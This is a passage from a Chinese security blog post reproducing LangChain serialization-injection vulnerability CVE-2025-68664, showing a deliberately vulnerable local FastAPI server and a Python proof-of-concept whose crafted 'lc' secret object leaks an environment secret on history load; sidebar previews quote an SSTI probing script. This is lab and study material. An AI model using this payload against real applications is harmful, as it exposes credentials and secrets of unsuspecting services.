dumpd(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DB_FILE, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        history = json.load(f)</span><br><span class="line">        history.append(serialized_msg)</span><br><span class="line">        f.seek(<span class="number">0</span>)</span><br><span class="line">        json.dump(history, f)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;Message saved&quot;</span>, <span class="string">&quot;serialized_data&quot;</span>: serialized_msg&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/get_history&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_history</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(DB_FILE, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            history_data = json.load(f)</span><br><span class="line">        </span><br><span class="line">        restored_messages = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> history_data:</span><br><span class="line">            obj = load(item) </span><br><span class="line">            restored_messages.append(obj)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;history&quot;</span>: <span class="built_in">str</span>(restored_messages)&#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e), <span class="string">&quot;message&quot;</span>: <span class="string">&quot;反序列化失败&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">os.environ[<span class="string">&quot;API_SECRET&quot;</span>] = <span class="string">&quot;Flag&#123;Real_World_Attack_Success&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 服务端启动中...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 目标机密: API_SECRET&quot;</span>)</span><br><span class="line">    uvicorn.run(app, host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>

<p>我们可以就可以利用刚刚的漏洞编写出这个poc完成攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8000/send_message&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;你好，这是一条普通的消息&quot;</span>,</span><br><span class="line">    <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;my_hack&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;lc&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;secret&quot;</span>,</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: [<span class="string">&quot;API_SECRET&quot;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 1. 发送恶意消息 (埋雷)...&quot;</span>)</span><br><span class="line">response = requests.post(url, json=payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;服务器响应: <span class="subst">&#123;response.json()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] 2. 触发读取历史 (引爆)...&quot;</span>)</span><br><span class="line">trigger_url = <span class="string">&quot;http://127.0.0.1:8000/get_history&quot;</span></span><br><span class="line">trigger_response = requests.get(trigger_url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-] 服务器返回的历史记录:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(trigger_response.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2026/01/03/cve-2025-68664/7.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://ireel.github.io">ivory</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://ireel.github.io/2026/01/03/cve-2025-68664/">http://ireel.github.io/2026/01/03/cve-2025-68664/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://ireel.github.io" target="_blank">ivory's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/cve/">cve</a><a class="post-meta__tags" href="/tags/ai/">ai</a><a class="post-meta__tags" href="/tags/langchain/">langchain</a></div><div class="post-share"><div class="social-share" data-image="/img/langchain.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/01/rce-plus/" title="RCE补课"><img class="cover" src="/img/bash.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">RCE补课</div></div><div class="info-2"><div class="info-item-1">RCE补课linux shell解析命令的过程遵循“一切皆字符串原则”，除去特殊符号的作用外，一都认为是字符串，没有别的数据类型 如果出现特殊符号，例如通配符，或者变量，则会全部替换成字符串，再进入shell解析 例如: cat flag  这句命令中的 cat 和 flag，事实上都被认为是字符串 然后shell通过空格将参数分隔 第一个位置的参数必须是命令（可执行文件路径、内置命令、函数） 后面的所有位置都作为传递给命令的参数 特殊符号与特殊变量命令链接符; 和 || 无论成败都继续执行: ping 127.0.0.1; cat /flag &amp;&amp; 与运算，仅成功时执行，可以用来盲注：mkdir test &amp;&amp; cd test 通配符* (星号)：匹配 任意长度 的任意字符。? (问号)：匹配 单个 任意字符。[]：匹配括号内的 任意一个 字符。cat /fla[e-h]&#123;&#125; 扩展生成，cp config.php&#123;,.bak&#125; -&gt; 等效于 cp config.php...</div></div></div></a><a class="pagination-related" href="/2026/01/23/scarlet-ctf2026/" title="scarletctf2026复现"><img class="cover" src="/img/logo/scarlet.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">scarletctf2026复现</div></div><div class="info-2"><div class="info-item-1">Web语言不通真的是硬伤 CommentaryDescriptionYou’re currently speaking to my favorite host right now (ctf.rusec.club), but who’s to say you even had to speak with one? Sometimes, the treasure to be found is just bloat that people forgot to remove. solve这里的不和host对话直接就是请求报文中不使用HOST的意思 当时没看懂什么意思 其中HTTP/1.1协议规定必须携带host请求头 所以我们只能使用HTTP/1.0协议 可以使用命令行发送 echo -e &quot;GET / HTTP/1.0\r\n\r\n&quot; | nc ctf.rusec.club 80  也可以使用python脚本发送和接收 import sockettarget_host = &quot;ctf.rusec.club&quot;target_port =...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-29</div><div class="info-item-2">pickle反序列化</div></div><div class="info-2"><div class="info-item-1">Picklehttps://goodapple.top/archives/1069pickle反序列化比java和php的危害要大不少因为利用起来比较容易，很轻松可以RCE经常和其它基础漏洞配合起来使用 能够序列化的对象 None bool int,float,complex 元素全部为可打包对象的tuple、list、set 和 dict 函数 使用def定义的模块顶层的函数(lambda不行) 内置函数   类 使用class定义在模块顶层的   实例对象 __dict__属性和__getstate__()函数的返回值为可序列化对象    PS:对于不能序列化的数据会抛出PicklingError异常 opcode和Bytecodepickle的序列化数据的一种格式是opcode（直译就是操作码） 是一种独立的栈语言， Python Bytecode (.pyc): 是给 PVM (Python Virtual Machine) 看的，用于通用的程序逻辑 例如： def add(a, b):    return a + b  转换成指令流： 2           0...</div></div></div></a><a class="pagination-related" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-29</div><div class="info-item-2">python沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">Python 沙箱逃逸栈帧逃逸2025 mini-L pyboximport multiprocessingimport sysimport ioimport astclass SandboxVisitor(ast.NodeVisitor):    forbidden_attrs = &#123;        &quot;__class__&quot;, &quot;__dict__&quot;, &quot;__bases__&quot;, &quot;__mro__&quot;, &quot;__subclasses__&quot;,        &quot;__globals__&quot;, &quot;__code__&quot;, &quot;__closure__&quot;, &quot;__func__&quot;, &quot;__self__&quot;,        &quot;__module__&quot;, &quot;__import__&quot;, &quot;__builtins__&quot;,...</div></div></div></a><a class="pagination-related" href="/2025/12/29/pollution/" title="原型链污染(js&#x2F;python)"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-29</div><div class="info-item-2">原型链污染(js&#x2F;python)</div></div><div class="info-2"><div class="info-item-1">原型链污染原型和原型链和类和对象的继承关系很像对比起来理解就很容易了: javascripthttps://blog.csdn.net/qq_51586883/article/details/119867720例子: function person()&#123;    this.name=&quot;liahuqiu&quot;;    this.test=function () &#123;        return 23333;​    &#125;&#125;person.prototype.a=3;web=new person();console.log(web.test());console.log(web.a)  假设有merge函数 function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key],...</div></div></div></a><a class="pagination-related" href="/2025/07/16/flask-memory-shell/" title="flask_ssti内存马"><img class="cover" src="/img/logo/Python.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-16</div><div class="info-item-2">flask_ssti内存马</div></div><div class="info-2"><div class="info-item-1">内存马https://www.cnblogs.com/gxngxngxn/p/18181936这里的内存不是二进制那些高深的概念就是改变某些在请求过程中，会起到作用的属性和方法，从而达到我们的目的写内存马的前提不同于文件马需要实现的是代码执行而不是文件读写 利用脚本找出ssti中存在的evalimport requestsurl = &quot;http://127.0.0.1:5000?name=&quot;for i in range(0,400):    payload=&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot; + str(i) + &quot;].__init__.__globals__.__builtins__.eval(&#x27;print(0)&#x27;)&#125;&#125;&quot;    response = requests.get(url=url+payload)    if response.status_code == 200:       ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ivory</div><div class="author-info-description">或许你的思绪也能存活千年</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ireel"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#langchain%E5%BA%8F%E5%88%97%E5%8C%96-CVE-2025-68664"><span class="toc-number">1.</span> <span class="toc-text">langchain序列化 CVE-2025-68664</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.0.1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-number">1.0.2.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-%E6%BA%90%E7%A0%81%E9%80%BB%E8%BE%91"><span class="toc-number">1.0.3.</span> <span class="toc-text">调试分析&#x2F;源码逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%9C%BA%E6%99%AF%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.4.</span> <span class="toc-text">实际场景复现</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/23/scarlet-ctf2026/" title="scarletctf2026复现"><img src="/img/logo/scarlet.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="scarletctf2026复现"/></a><div class="content"><a class="title" href="/2026/01/23/scarlet-ctf2026/" title="scarletctf2026复现">scarletctf2026复现</a><time datetime="2026-01-23T05:46:55.000Z" title="发表于 2026-01-23 13:46:55">2026-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/03/cve-2025-68664/" title="langchain序列化注入-CVE-2025-68664"><img src="/img/langchain.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="langchain序列化注入-CVE-2025-68664"/></a><div class="content"><a class="title" href="/2026/01/03/cve-2025-68664/" title="langchain序列化注入-CVE-2025-68664">langchain序列化注入-CVE-2025-68664</a><time datetime="2026-01-03T12:21:17.000Z" title="发表于 2026-01-03 20:21:17">2026-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/01/rce-plus/" title="RCE补课"><img src="/img/bash.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RCE补课"/></a><div class="content"><a class="title" href="/2026/01/01/rce-plus/" title="RCE补课">RCE补课</a><time datetime="2026-01-01T12:07:53.000Z" title="发表于 2026-01-01 20:07:53">2026-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pickle反序列化"/></a><div class="content"><a class="title" href="/2025/12/29/pickle-unserialize/" title="pickle反序列化">pickle反序列化</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸"><img src="/img/logo/Python.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python沙箱逃逸"/></a><div class="content"><a class="title" href="/2025/12/29/python-sandbox/" title="python沙箱逃逸">python沙箱逃逸</a><time datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/Commedia/videoframe_248026.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 - 2026 By ivory</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="13468436268" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false 
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>